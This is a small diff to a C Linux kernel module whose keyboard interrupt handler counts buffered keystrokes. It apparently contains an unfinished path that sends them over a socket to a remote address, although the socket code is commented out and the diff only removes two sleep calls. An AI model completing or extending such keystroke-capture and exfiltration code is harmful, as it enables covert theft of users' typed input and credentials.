@@ -32,10 +32,8 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         printk(KERN_INFO "Buffer size: %d\n", buffer_count);
 
         if (buffer_count == 0) {
-            msleep(2000);
             //struct socket* sock = create_socket(IP_ADDRESS, PORT);
             printk(KERN_INFO "Created socket\n");
-            msleep(5000);
             //if (sock == NULL) {
              //   printk(KERN_INFO "Oh no, no connection\n");
                // return IRQ_NONE;
